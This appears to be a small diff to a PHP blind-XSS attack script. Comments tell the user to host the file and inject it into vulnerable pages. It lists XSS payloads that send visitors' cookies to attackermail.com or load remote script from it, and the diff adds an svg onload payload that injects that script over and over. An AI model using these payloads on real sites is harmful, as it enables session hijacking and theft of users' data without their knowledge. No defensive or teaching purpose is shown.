@@ -2,6 +2,7 @@
 // Host this file on webserver and inject it on vulnerable page.
 // <script>new Image().src="https://attackermail.com/xsslogger.php?cookie="+document.cookie;</script>
 // <script src="https://attackermail.com/xss-blind.php"></script>
+// <svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//attackermail.com/xss-blind.php";d.body.appendChild(z)},0)>
 header('Content-Type: text/javascript');
 ?>
 var mailer = '<?php echo "//" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"] ?>';
